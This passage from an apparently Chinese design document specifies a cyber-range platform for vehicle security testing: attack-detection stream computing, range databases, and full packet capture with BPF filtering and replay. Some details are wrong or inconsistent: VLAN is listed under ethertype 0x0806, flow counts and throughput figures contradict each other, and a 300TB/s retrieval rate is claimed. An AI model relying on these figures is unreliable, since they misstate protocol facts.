title="方案简介"></a>方案简介</h4><p>针对低延迟、高吞吐量和实时智能汽车相关复杂攻击检测，采用复杂攻击知识图谱流计算模块进行支撑，用于处理实时安全数据流。智能汽车攻击子图模式管理与注册是根据子图状态以及消息队列的模式注册。</p><p>随着攻击子图的变化与更新，能够实现流计算安全知识的匹配与加载更新。针对实时、持续、不间断、间隔不定的安全事件数据，通过流计算引擎将其接收，并利用知识匹配的方式，对其复杂攻击组成的攻击步骤进行组合分析，从而产生复杂攻击。智能汽车复杂攻击检测场景流式计算模式，将复杂攻击覆盖车云协同业务场景，流计算匹配流程如下图所示，实时流式接收智能汽车安全事件，进行在线知识匹配与关联分析，系统支持高并发流计算，可同时对多个试验进行复杂攻击检测，而不同试验的并发计算任务是相互独立的，复杂攻击的实时计算并发支持200个，且支持24小时内的数据流在线匹配关联分析。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6e0243ce36bb8a3af4fae2a5901cd372.png"></p><p>复杂攻击知识匹配流计算主要特点包括以下：</p><ol><li>实时数据流：复杂攻击知识匹配流计算引擎处理连续不断生成的实时数据流，这些数据流主要来自于融合后的安全事件。<ol><li>事件驱动：复杂攻击知识匹配流计算引擎是基于安全事件驱动的，针对立即响应到达的安全事件数据进行处理，若无数据达到则不做处理。<ol><li>低延迟：复杂攻击知识匹配流计算引擎具有非常低的处理延迟，通常以毫秒或亚毫秒为单位，这样有利于实时生成复杂攻击结果，并流转到下一环节。<ol><li>高吞吐量：复杂攻击知识匹配流计算引擎高吞吐量的处理能力，针对靶场汽车相关应用比如安全竞赛、产品众测或攻防演练，通常应用规模较大，也会产生大量的安全事件数据，因此需要较高处理性能应对这一场景。</li><li>窗口操作：复杂攻击知识匹配流计算引擎使用窗口操作来处理数据，窗口可以根据时间、事件数量或其他标准对数据进行分组和聚合，以便进行更复杂的分析。</li><li>状态管理：复杂攻击知识匹配流计算引擎针对状态信息进行管理和维护，用于在处理数据流时跟踪和聚合信息。</li><li>容错性：复杂攻击知识匹配流计算引擎具备容错性，以确保在系统故障或错误发生时能够继续处理数据流，而不会丢失数据或引发不一致性。</li></ol></li></ol></li></ol></li></ol><p>复杂攻击知识匹配流计算主要包括三大模块元素：复杂攻击知识、复杂攻击场、汽车应用试验。</p><p>针对复杂攻击知识，支持进行模板下载，并基于下载好的模板，进行知识整理和文件上传，用于作为复杂攻击匹配的基础知识。复杂攻击场景主要应用于智能汽车场景、OTA升级场景、车云协同场景等汽车场景。汽车应用试验保证试验之间互相独立计算，并在试验结束后进行相关数据销毁，从而释放对应资源。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d702c15898d2b0dc6d6af4e1e3292f60.png"></p><h2 id="多模态网络仿真数据库模块"><a href="#多模态网络仿真数据库模块" class="headerlink" title="多模态网络仿真数据库模块"></a>多模态网络仿真数据库模块</h2><ul><li>支持镜像、实物设备、工具、场景模板等元数据的关系数据存储，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/fa3966a363d59a07a7bfd2b082c7b778.png" alt="IMG_256"></p><h4 id="方案设计-9"><a href="#方案设计-9" class="headerlink" title="方案设计"></a>方案设计</h4><p>功能参数设计为，系统支持镜像、实物设备、工具、场景模板等元数据的关系数据存储。支持镜像大文件存储和工具、场景模板文件的存储，采用分布式对象存储。系统支持关系数据、文件数据、索引数据、时序数据等多种模态数据的存储和查询。能够将多模态数据映射成靶场标准数据结构，提供物理设备状态、虚拟节点状态和设备状态等时序数据的存储管理。支持试验过程中的配置数据、运行数据、系统配置和资源数据的高可靠存储服务。提供持续文本日志的原始数据存储和索引服务，支持日志数据的存储和快速检索。支持镜像文件、软件工具等大文件数据存储管理服务，确保大文件数据的高并发快速访存。</p><p>性能参数设计为，系统支持元数据存储数量达10万条，镜像存储空间为20TB，工具、场景模板等文件存储空间为5TB。</p><h5 id="引言-1"><a href="#引言-1" class="headerlink" title="引言"></a>引言</h5><p>随着网络安全实验需求的增加，对于靶场环境中数据的存储与管理提出了更高的要求。本设计方案旨在构建一个高效、可靠的靶场数据存储与管理系统，以支持复杂的网络安全试验场景。该系统将处理包括镜像、实物设备、工具、场景模板等在内的多模态数据，并提供高性能的数据存储、查询和管理服务。</p><h5 id="系统设计要求概述-1"><a href="#系统设计要求概述-1" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h5><p>元数据关系数据存储</p><p>支持镜像、实物设备、工具、场景模板等元数据的关系数据存储。</p><p>大文件存储服务</p><p>支持镜像大文件存储，及工具、场景模板等文件的存储。</p><p>支持文件的分布式对象存储。</p><p>多模态数据存储与查询</p><p>支持关系数据、文件数据、索引数据、时序数据等多种模态数据的存储和查询。</p><p>数据结构映射与时序数据管理</p><p>支持将采集到的多模态数据映射成靶场标准的数据结构。</p><p>提供物理设备状态、虚拟节点状态和设备状态等时序数据的存储管理。</p><p>试验数据高可靠存储服务</p><p>支持对试验过程中的配置数据、运行数据、系统配置和资源数据的高可靠存储服务。</p><p>日志数据存储与检索</p><p>提供持续文本日志的原始数据存储和索引服务。</p><p>支持日志数据的存储、快速检索功能。</p><p>大文件数据存储管理服务</p><p>提供镜像文件、软件工具等大文件数据存储管理服务。</p><p>支持大文件数据的高并发快速访存。</p><h5 id="技术实施方案"><a href="#技术实施方案" class="headerlink" title="技术实施方案"></a>技术实施方案</h5><p>数据库集成</p><p>系统将集成多种数据库服务，每种服务针对其擅长处理的数据类型进行优化配置。这将包括关系型数据库服务、对象存储服务、搜索引擎服务和时间序列数据库服务。</p><p>数据映射引擎</p><p>数据映射引擎将使用ETL（提取、转换、加载）工具，如Talend或Apache NiFi，来实现数据的转换和标准化。这将确保不同来源的数据能够被系统正确理解和处理。</p><p>高可靠性存储架构</p><p>系统将采用RAID或分布式副本的方式来确保数据的高可用性和耐久性。这将防止硬件故障导致的数据丢失，并保证数据存储服务的连续性。</p><p>日志管理服务部署</p><p>日志管理服务将采用成熟的ELK（Elasticsearch, Logstash, Kibana）堆栈，以便于日志的收集、存储、分析和可视化。</p><p>大文件数据访问优化</p><p>对于大文件数据的存储管理，系统将采用分布式文件系统和CDN技术，以提高数据的传输效率和访问速度。同时，系统将实现智能的数据缓存策略，以减少数据访问延迟。</p><p>通过本设计方案，靶场数据存储与管理系统将提供一个全面的数据处理和管理解决方案，满足网络安全实验的需求。系统将支持高性能的数据存储、查询和管理服务，处理多模态数据，并确保试验数据的高可靠性。通过实施本方案，靶场环境将能够更高效地进行网络安全试验，并提供丰富的数据支持。</p><h4 id="方案简介-7"><a href="#方案简介-7" class="headerlink" title="方案简介"></a>方案简介</h4><p>在新业务场景和大数据分析等需求的驱动下，多模型数据管理成为近几年成为业界热点。在OLTP领域，自2012年以来相继出现多款多模原生数据库系统（multi-model database system），如OrientDB，ArangoDB等，而Oracle、PG、SQL Server等老牌关系型数据库系统，也陆续增加了对多模型的支持。 对于这种industry-driven的系统和问题， 使用该系统的必要性主要包括两点:一是传统单一的测量方式无法满足当今多样化的研究需求;二是该系统本身具有的一系列功能和优点。</p><p>随着网络功能的多样化,而传统单一的评价用户体验、可用性测试等的方法已无法满足具体的多样化的研究需求。多模态数据库用于网络仿真，可以具有多维度数据整合与分析、可视化数据分析界面、功能强大且易用、模块化设计，满足不同研究需求、应用领域极其广泛，传统方法所不具备的其它优势等。</p><h2 id="靶场信息库模块"><a href="#靶场信息库模块" class="headerlink" title="靶场信息库模块"></a>靶场信息库模块</h2><ul><li>提供靶场人员、靶场设备信息元数据存储和关系查询功能，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/57873fffb7bdb93ab0598635a753e5b8.png"></p><p>支持动态实时判定靶场剩余资源，并给出耗尽提示。支持展示靶场中现存的虚拟机、模板、路由器、防火墙等资源等统计信息。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/5ec72a143b5cc840f72232140ab62732.png"></p><p>虚拟交换机状态信息</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b7e10f08b5356c0ae798b650d6de4190.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6ecbfbcb499ebe2e3faca44c2e37c363.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/3c74ae3293ad08e47ae3a2d7fe3db5c2.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/78fcbd64d6a7471a20477c4dbf6a5512.png"></p><p>虚拟资源统计信息查询</p><p>支持通过内置云盘实现仿真场景环境与外部环境的文件安全交换功能，可查看内置云盘的使用及剩余空间信息，可查看云盘中现存文件列表，并对其进行分类筛选、搜索等操作。</p><p>功能参数设计为，系统提供靶场人员、靶场设备信息元数据存储和关系查询功能。支持靶场服务器CPU、内存、磁盘、网络使用状态等时序数据的存储和查询，包括CPU、内存和磁盘、网络使用状态的日期聚合查询。提供靶场虚拟计算服务器内虚拟交换机状态信息的存储和查询。支持靶场内虚拟资源利用情况的存储和查询，包括虚拟CPU、内存和硬盘的当前使用和超配信息。</p><p>性能参数设计为，系统提供50台靶场服务器状态存储和查询的能力，靶场服务器状态信息最低存储间隔支持不高于10秒设置。</p><h5 id="引言-2"><a href="#引言-2" class="headerlink" title="引言"></a>引言</h5><p>为了提高靶场的运维效率和资源利用率，本方案旨在构建一个靶场数据管理与监控系统。该系统将实现靶场人员、设备信息元数据的存储与查询，服务器及虚拟资源的时序数据监控，以及高效的状态聚合查询功能。通过该系统，靶场管理者可以快速获取设备状态，优化资源配置，确保靶场的高效运行。</p><h5 id="系统设计要求概述-2"><a href="#系统设计要求概述-2" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h5><p>靶场人员与设备信息元数据存储和查询</p><p>提供靶场人员、靶场设备信息元数据存储和关系查询功能。</p><p>服务器状态时序数据存储和查询</p><p>提供靶场服务器CPU、内存、磁盘、网络使用状态等时序数据存储和查询。</p><p>提供CPU、内存、磁盘、网络使用状态按日期聚合查询功能。</p><p>虚拟交换机状态信息存储和查询</p><p>提供靶场虚拟计算服务器内虚拟交换机状态信息的存储和查询功能。</p><p>虚拟资源利用情况存储和查询</p><p>提供靶场内虚拟资源利用情况的存储和查询，包括虚拟CPU、内存和硬盘的当前使用和超配信息。</p><h5 id="系统设计详述-1"><a href="#系统设计详述-1" class="headerlink" title="系统设计详述"></a>系统设计详述</h5><p>元数据存储与查询功能</p><p>系统将采用关系型数据库管理系统（RDBMS），如PostgreSQL或MySQL，来存储靶场人员与设备信息的元数据。数据库将被设计为支持快速关系查询，以便用户能够通过一个简洁的图形界面查询相关信息。</p><p>系统将提供一个用户界面，用以展示靶场人员与设备的信息，并支持截图功能。该界面将允许用户通过筛选条件进行搜索，并将结果以表格或图形的形式展示。用户可以从界面上直接截图，以便于报告制作或记录保留。</p><p>服务器状态时序数据存储和查询</p><p>系统将集成时序数据库（TSDB），如InfluxDB，来存储服务器的CPU、内存、磁盘和网络使用状态等时序数据。时序数据库优化了时间戳数据的存储和查询，适合处理高频率的数据采集。</p><p>聚合查询功能</p><p>系统将提供一个聚合查询工具，该工具能够按照日期对服务器的CPU、内存、磁盘和网络使用状态进行分析和查询。这将帮助管理员了解资源的使用趋势，并进行相应的资源调整。</p><p>虚拟交换机状态信息存储和查询</p><p>系统将扩展其数据库模型，以包含虚拟交换机的状态信息存储和查询。这将允许管理员监控和管理虚拟计算环境中的网络流量和配置状态。</p><p>虚拟资源利用情况存储和查询</p><p>系统将能够存储和查询靶场内虚拟资源的利用情况，包括虚拟CPU、内存和硬盘的当前使用和超配信息。这些信息将帮助管理员优化虚拟资源的分配，避免资源浪费。</p><h5 id="技术实现方案-1"><a href="#技术实现方案-1" class="headerlink" title="技术实现方案"></a>技术实现方案</h5><p>数据库架构设计</p><p>关系型数据库：用于存储靶场人员和设备信息的元数据，以及提供关系查询功能。</p><p>时序数据库：用于存储服务器状态的时序数据，并支持高频率的数据写入和时间范围查询。</p><p>用户界面设计</p><p>设计一个直观的用户界面，用于展示和查询靶场数据。</p><p>界面将包括实时数据监控、历史数据查询、系统日志和报警系统。</p><p>数据采集和监控</p><p>部署数据采集代理在靶场服务器上，以收集CPU、内存、磁盘和网络使用状态信息。</p><p>采集的数据将以不高于10秒的间隔发送到时序数据库。</p><p>数据安全与备份</p><p>实施数据加密和访问控制，确保数据的安全性。</p><p>定期备份数据库，以防数据丢失。</p><p>性能优化</p><p>优化数据库索引，加快查询速度。</p><p>对时序数据实施数据降采样，以提高存储效率。</p><p>通过本设计方案，靶场数据管理与监控系统将为靶场管理员提供一个全面的数据管理和监控平台。系统将支持多种数据类型的存储和查询，包括元数据、时序数据和虚拟资源状态。同时，系统将保证高性能和数据安全性，确保靶场的高效和稳定运行。通过这一系统的实现，靶场运维人员将能够更加便捷地管理和监控靶场资源，提升靶场的运维效率。</p><h2 id="试验数据库模块"><a href="#试验数据库模块" class="headerlink" title="试验数据库模块"></a>试验数据库模块</h2><ul><li>支持高精准可靠的试验过程流量数据包存储，并发流处理性能2000万个以上，新建流处理性能不低于5万/秒，功能全开启情况下流量存储性能不低于10Gbps，数据包100%进行全包存储（写入机械硬盘）、无截断、无丢包。支持数据包压缩存储，全流量存储到硬盘时，可以选择压缩/不压缩，支持数据包加密存储，加密的方法支持选择SM4国密算法加密、AES(128,192,256)对称加密算法，以及CBC、ECB加密格式；存储容量不低于20TB，能够根据五元组等进行高速流检索和报文获取，数据包检索性能可达300TB/s，检索结果中应能体现详细信息，包括检索范围、检索耗时、检索到的数据包数和会话数量。</li></ul><p>为保障试验过程的精准度与可靠性，本系统搭载了能力强大的流量数据包存储功能。这个功能在确保高精度数据采集的同时，提供了超过2000万个并发流处理的性能。不仅如此，系统新建流处理的能力也相当强劲，性能不低于5万个流每秒，这样的速率足以应对高负载下的流量处理需求。</p><p>即使在功能全开启的情况下，系统的流量存储性能仍能达到10Gbps的高标准。重要的是，它能够实现对数据包的100%全包存储——这意味着每个数据包被完整地写入机械硬盘，既无截断也无丢失，确保流量数据的完整性与精准性。</p><p>系统提供了数据包压缩存储的选择，用于优化存储空间使用。用户可以根据需求选择开启或关闭压缩功能，在全流量存储到硬盘时按照需求进行操作。同时，为了提高数据安全性，系统还支持包含SM4国密算法在内的多种数据包加密存储方式。除此之外，还支持常用的AES(128,192,256)对称加密算法以及CBC和ECB等格式，为用户提供了多样化的安全选项。</p><p>为了满足数据检索与存储的高要求，系统的存储容量不低于20TB。它配备了高速流检索与报文获取功能，可以基于源/目标IP，源/目标端口，传输协议等五元组信息进行流检索，数据包检索性能达到卓越的300TB/s水平。</p><p>在检索结果中，系统能够提供详尽的信息，包括检索的范围、消耗的时间、检索到的数据包数量以及会话的数量。这一综合功能不仅大幅提升了网络试验的效率和质量，同时也使得分析人员在进行网络安全分析、故障诊断和性能评估时，拥有了足够的数据支持。</p><p>此系统以其高精准度和优异的可靠性，为现代试验过程中的流量数据包存储与处理设定了新标准，能够满足最苛刻测试环境的需求并确保信息安全，是汽车网络安全试验中不可或缺的重要组成部分。</p><h4 id="方案设计-10"><a href="#方案设计-10" class="headerlink" title="方案设计"></a>方案设计</h4><p>功能参数设计为，系统提供试验场景配置数据的存储，包括场景中节点配置信息、节点间连线关系、子网信息、端口信息等，并支持场景配置数据的快速查询。支持虚拟节点状态时序数据的存储管理。提供持续文本日志的原始数据存储和索引服务，支持日志数据的存储和快速检索。支持试验过程中流量数据的存储、监视和导出，支撑试后进行流量回溯和查询。支持根据特征数据（ASCII值、16进制、中文、正则表达式）对数据包进行搜索。支持将接收的网络流量进行实时转发，自定义转发规则，包括BPF、流规则，将符合规则的流量转发到物理网卡上，转发时支持增加GRE、VXLAN封装。支持将检索查询到的历史数据报文回放到指定的物理网卡上，回放过程支持增加GRE、VXLAN的隧道封装，增加、修改VLAN标识，支持设定回放速率，将原始流量按需加速或减速回放，回放速率支持配置包速率或字节速率。</p><p>性能参数设计为，系统支持高精准可靠的试验过程流量数据包存储，其并发流处理性能达2000万个以上，新建流处理性能5万/秒，功能全开启情况下流量存储性能10Gbps，数据包100%全包存储（写入机械硬盘）、无截断、无丢包。支持数据包压缩存储，全流量存储到硬盘时可选择压缩/不压缩，支持数据包加密存储，加密方法包括SM4国密算法加密、AES(128,192,256)对称加密算法，以及CBC、ECB加密格式。存储容量为20TB，能够根据五元组等进行高速流检索和报文获取，数据包检索性能可达300TB/s，检索结果中应体现详细信息，包括检索范围、检索耗时、检索到的数据包数和会话数量。支持以10Gbps速率进行转发，支持10Gbps网卡线速回放。</p><h5 id="引言-3"><a href="#引言-3" class="headerlink" title="引言"></a>引言</h5><p>在现代网络环境中，对网络流量的管理与分析需求愈发严格。本方案旨在设计一套综合网络流量管理与分析系统，以满足试验场景配置、虚拟节点状态管理、日志存储检索、流量监视导出、特征数据搜索、实时流量转发、历史数据回放等多样化的需求。系统将提供高精准的流量数据包存储与处理能力，确保试验数据的完整性与安全性。</p><h5 id="系统设计要求概述-3"><a href="#系统设计要求概述-3" class="headerlink" title="系统设计要求概述"></a>系统设计要求概述</h5><p>试验场景配置数据存储与查询</p><p>提供试验场景配置数据的存储，包括节点配置信息、节点间连线关系、子网信息、端口信息等，并支持快速查询。</p><p>虚拟节点状态时序数据管理</p><p>提供虚拟节点状态时序数据的存储管理。</p><p>文本日志数据存储与检索</p><p>提供持续文本日志的原始数据存储和索引服务，支持日志数据的存储、快速检索功能。</p><p>流量数据存储、监视与导出</p><p>提供试验过程中流量数据的存储、监视和导出功能，支持试后流量回溯和查询。</p><p>特征数据搜索</p><p>支持根据ASCII值、16进制、中文、正则表达式等特征数据对数据包进行搜索。</p><p>实时流量转发</p><p>支持将接收的网络流量进行实时转发，自定义转发规则，支持增加GRE、VXLAN封装。</p><p>历史数据报文回放</p><p>支持将检索查询到的历史数据报文回放到指定的物理网卡上，并支持多种回放配置。</p><h5 id="性能-1"><a href="#性能-1" class="headerlink" title="性能"></a>性能</h5><p>并发流处理性能：2000万个以上。</p><p>新建流处理性能：5万/秒。</p><p>流量存储性能：功能全开启下10Gbps。</p><p>全包存储：100%，不截断、无丢包。</p><p>数据包压缩存储：支持选择压缩/不压缩。</p><p>数据包加密存储：支持SM4、AES(128,192,256)、CBC、ECB。</p><p>存储容量：20TB。</p><p>数据包检索性能：可达300TB/s。</p><p>10Gbps网卡线速回放。</p><h5 id="系统设计详述-2"><a href="#系统设计详述-2" class="headerlink" title="系统设计详述"></a>系统设计详述</h5><p>试验场景配置数据存储与查询</p><p>系统将采用关系型数据库存储试验场景配置数据，支持复杂查询操作。数据库设计将考虑到查询效率，采用适当的索引策略以加快检索速度。</p><p>虚拟节点状态时序数据管理</p><p>时序数据库将用于存储虚拟节点的状态数据，允许用户根据时间点检索节点状态，以便于分析节点在试验过程中的性能变化。</p><p>文本日志数据存储与检索</p><p>文本日志将使用全文搜索引擎如Elasticsearch进行存储和索引，提供快速的检索能力，以便用户能够迅速定位到相关日志信息。</p><p>流量数据存储、监视与导出</p><p>系统将集成高性能的网络流量捕获工具，如Wireshark或tcpdump，以便于流量数据的存储和监视。同时，系统将支持流量数据的导出，以便于试验后的分析。</p><p>特征数据搜索</p><p>系统将提供一个强大的数据包搜索工具，允许用户根据不同的特征数据进行搜索，包括ASCII值、16进制、中文字符和正则表达式。</p><p>实时流量转发</p><p>系统将集成流量转发工具，如iptables或专用的网络处理框架，支持用户自定义的BPF、流规则，以及GRE、VXLAN封装的增加。</p><p>历史数据报文回放</p><p>系统将提供数据报文回放功能，支持在物理网卡上回放历史流量。回放功能将支持增加GRE、VXLAN封装，VLAN标识的修改，以及回放速率的配置。</p><h5 id="技术实施方案-1"><a href="#技术实施方案-1" class="headerlink" title="技术实施方案"></a>技术实施方案</h5><p>数据库与存储</p><p>关系型数据库用于存储静态配置数据。</p><p>时序数据库用于管理动态状态数据。</p><p>全文搜索引擎处理文本日志数据。</p><p>高性能存储系统用于流量数据包存储。</p><p>数据采集与监控</p><p>集成网络流量采集工具，实现数据包的捕获与存储。</p><p>实时监控工具用于观察网络流量和虚拟节点状态。</p><p>数据加密与压缩</p><p>提供数据包压缩存储选项，减少存储空间需求。</p><p>支持SM4、AES等加密算法，保障数据安全。</p><p>流量处理与回放</p><p>集成流量处理引擎，实现实时流量转发和过滤。</p><p>实现数据报文回放功能，包括回放速率和封装配置。</p><p>性能优化</p><p>优化存储和检索路径，实现高速数据包检索。</p><p>网络硬件和软件选择，确保10Gbps的线速处理和回放。</p><p>本系统设计方案提供了一个全面的网络流量管理与分析解决方案，以满足高精准、高性能的数据存储与处理需求。通过本系统的实施，用户将能够有效地管理试验场景配置、监控虚拟节点状态、存储和检索日志数据、分析流量数据，以及执行高速的数据包回放。这将为网络安全和性能分析提供强大的技术支持，确保试验数据的完整性与安全性。</p><h4 id="方案简介-8"><a href="#方案简介-8" class="headerlink" title="方案简介"></a>方案简介</h4><p>业务需求：通过建设网络原始流量审计分析系统，将网络中的网络原始流量数据进行获取与记录，提供相关网络安全事件的事后审计能力，完整真实的还原网络安全事件的原始场景，并提供与事件相关的原始报文检索与获取，满足分析需求；提供接口支持第三方系统检索、提取原始流量数据，为进行安全事件检测分析提供数据支撑和检索支撑。</p><p>技术需求：网络原始流量审计分析系统旁路部署在网络中，通过分光或者交换机镜像方式接入网络获取和记录数据，实现对网络原始流量的高效存储，同时提供系统接口和可视化操作界面，能够供其它业务系统及分析人员手动提取、检索原始网络报文数据。</p><p>系统需求：网络原始流量审计分析系统通过分光或者交换机镜像方式接入网络获取和记录数据，支持多路网络流量的接入，将线路上网络流量数据捕获存储到硬盘上；提供原始流量存储和高效检索功能，支持原始流量全量存储，支持按需提取网络原始流量数据包；提供系统接口和可视化操作界面，能够供其它业务系统或分析人员手动提取、检索原始网络报文数据。系统需包括报文获取、报文存储、磁盘数据管理、数据检索、检索接口、系统管理等功能。</p><p>功能指标：提供原始流量存储和高效检索功能，支持原始流量全量存储，支持多网卡输入，支持按需提取网络原始流量数据包，提供接口支持第三方系统检索、提取原始流量数据。</p><h5 id="产品功能及性能"><a href="#产品功能及性能" class="headerlink" title="产品功能及性能"></a>产品功能及性能</h5><h6 id="产品功能"><a href="#产品功能" class="headerlink" title="产品功能"></a>产品功能</h6><p>原始流量获取功能支持描述</p><ul><li>支持EthernetⅡ、PPPoE、Vlan等链路层协议</li><li>支持IPV4、IPV6协议</li><li>支持分光或者交换机镜像方式接入网络获取数据</li><li>支持4个接口数据接入</li></ul><p>原始流量存储功能</p><ul><li>支持按BPF规则过滤后存储原始数据包</li><li>支持流量写覆盖，当存储空间不足时，可以将最早的数据写覆盖</li><li>支持索引机制，提高检索效率</li><li>支持数据保序，可以实现报文级保序</li><li>支持PTP、NTP时钟同步</li><li>支持报文保序后按时间段存入硬盘，便于后续提取</li><li>支持流量数据存储、监视和导出功能，支撑试后进行流量回溯和查询；</li></ul><p>数据检索功能</p><ul><li>数据的检测支持通过源IP、目的IP、源端口、目的端口、协议号 五元的任意组合进行数据检索</li><li>支持检索过程实时展示检索状态，并支持进行多任务并发控制，加速检索及数据读取速度</li><li>支持RESTful接口检索控制，及数据读取</li><li>支持根据特征数据（ASCII值、16进制、中文、正则表达式）对数据包进行搜索。</li><li>支持将接收的网络流量进行实时转发，在数据报文捕获分析的同时，能够自定义转发规则，包括BPF、流规则，将符合规则的流量转发到物理网卡上，转发时支持增加GRE、VXLAN封装；</li><li>支持将检索查询到的历史数据报文回放到指定的物理网卡上。回放过程支持增加GRE、VXLAN的隧道封装，回放过程支持增加、修改VLAN标识，支持设定回放速率，将原始流量按需进行加速或者减速回放，回放速率支持配置包速率或字节速率。</li></ul><p>系统管理功能</p><ul><li>丰富的用户管理功能，支持增加、修改、删除用户，系统支持普通用户和管理员两个角色</li><li>支持用户操作日志记录，管理员可以对日志进行审计</li><li>支持设备集群管理、能添加设备、删除设备等操作</li><li>支持设备的基本管理：CPU、内存状态，磁盘使用状态，网卡流量统计等功能</li><li>支持对查询检索任务的管理：支持创建、停止、重启、删除、查询等功能</li><li>支持对查询检索任务的数据下载功能</li></ul><h6 id="产品性能"><a href="#产品性能" class="headerlink" title="产品性能"></a>产品性能</h6><ul><li>支持高精准可靠的试验过程流量数据包存储，并发流处理性能2000个以上，新建流处理性能不低于5万/秒，功能全开启情况下流量存储性能不低于10Gbps，数据包100%进行全包存储（写入机械硬盘）、无截断、无丢包。支持数据包压缩存储，全流量存储到硬盘时，可以选择压缩/不压缩，支持数据包加密存储，加密的方法支持选择SM4国密算法加密、AES(128,192,256)对称加密算法，以及CBC、ECB加密格式；存储容量不低于20TB，能够根据五元组等进行高速流检索和报文获取，数据包检索性能可达300TB/s，检索结果中应能体现详细信息，包括检索范围、检索耗时、检索到的数据包数和会话数量。</li><li>支持以10Gbps速率进行转发，支持10Gbps网卡线速回放。数据查询检索性能</li></ul><h5 id="产品技术方案"><a href="#产品技术方案" class="headerlink" title="产品技术方案"></a>产品技术方案</h5><h6 id="零层设计"><a href="#零层设计" class="headerlink" title="零层设计"></a>零层设计</h6><p>零层架构如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6670a3a102d4c58c0b6a56f4a49bd1b6.png"></p><p>设备使用通用X86服务器、操作系统使用linux系统及通用文件系统。</p><p>网络报文分析处理系统运行于OS与文件系统之上，通过WEB与RESTful接口统一进行管理，网络报文分析处理系统内部将设计多个模块，各个模块在一层设计中详细设计，每个模块将独立运行，通过消息队列，共享内存等方式传递数据。</p><h6 id="一层设计"><a href="#一层设计" class="headerlink" title="一层设计"></a>一层设计</h6><p>一层设计方案如下图</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b762e684d406226c8bb8a0a6d0894d52.png"></p><p>报文从接口接收进入系统后，先通过BPF规则过滤，符合抓包条件的报文将进行缓存，当达到一定数据量时，启动索引建立，并将报文落盘。</p><p>WEB提供用户管理及配置：支持增加、修改、删除用户，系统支持普通用户和管理员两个角色；支持管理员对用户的操作进行审计管理；支持对系统所用的服务器进行增加、修改、删除；支持监控并展示服务器的可用状态、磁盘使用情况、网卡流量信息；支持任务的创建、停止、重新启动、删除、查询等操作；支持对检索得到的结果进行按需下载查看。</p><p>WEB管理中还支持对NTP的配置，可以指定NTP服务器的IP或域名，系统将会定时通过NTP协议获取当前时间。</p><p>并支持网卡的PTP时钟同步。</p><p>RESTful可以为第三方软件提供相关接口管理。</p><p>检索读取系统为用户提供高速数据检索引读取业务。</p><p>在模块技术描述中将重点对BPF过滤系统、索引系统、数据存储系统及检索读取系统做详细的技术描述。</p><h6 id="详细设计"><a href="#详细设计" class="headerlink" title="详细设计"></a>详细设计</h6><p>BPF过滤模块</p><p>柏克莱封包过滤器（Berkeley Packet Filter，缩写 BPF），是针对TCP/IP报文中<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82">数据链路层</a>，IP层，传输层的一种报文识别接口，能根据用户提供的接口进行有针对性的报文过滤。</p><p>BPF将是针对报文进行逐包分析，在二层头分析时，主要分析二层头的type标记内容以下几类：</p><ul><li>ether type = 0x0800或0x86DD时： 此为普通的二层报文，跳过14字节二层头</li><li>ether type = 0x0806时：此为ARP报文，跳过14字节二层头</li><li>ether type = 0x0806时：此为VLAN报文，跳过18字节二层头</li><li>ether type = 0x88A8时：此为QINQ报文，跳过22字节二层头</li><li>ether type = 0x8863或0x8864时： 此为PPPOE报文，跳过14字节二层头</li></ul><p>而对于三层头分析时，是在跳过二层头之后，分为普通IPV4头分析、存在扩展头的IPV4头分析、普通IPV6头分析，存在扩展头的IPV6头分析，分析方法与上述二展头分析类型，都是直接跳到指定位置读取内容确定类型，然后读取出源IP、目的IP等，然后跳过三层头，四层头也是这类方法。</p><p>此模块中提供两部分功能：</p><ol><li>收包时的BPF处理，用户可以配置自已想要捕获报文进行BPF配置（不配BPF代表全量捕获），进行报文缓存：</li><li>检索与读取时的BPF处理，在检索时，可以先通过五元组（源IP、目的IP、源端口、目的端口、协议类型）的任意组合查到所有符合条件的所有报文，然后逐包进行BPF过滤，符合BPF条件的就保留，否则丢弃。</li></ol><p>过滤报文时，需要进行报文协议分析，二层解析时可支持EthernetⅡ、PPPoE、Vlan等链路层协议，三层解析时支持IPV4、IPV6协议，获取网络报文方式为分光或者交换机镜像方式接入网络获取数据，最大可支持4个接口数据接入。</p><p>数据缓存模块</p><p>由于前端支持高效BPF过滤，然后缓存于内存中，写入硬盘时，可以将缓存集中写入，因而可以达到5Gbps的报文处理性能，及5Gbps的存储写入性能。</p><p>当数据通过BPF过滤后，确定需要缓存时，就会将报文送到缓存模块中。缓存模块将会申请一块足够大的内存，用于存储报文（当前为4G，一个4字节地址空间最大为4G，因而每次缓存4G后直接落盘一个大文件），所有缓存报文按时间顺序排序缓存，且按PCAP抓包格式存放，如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 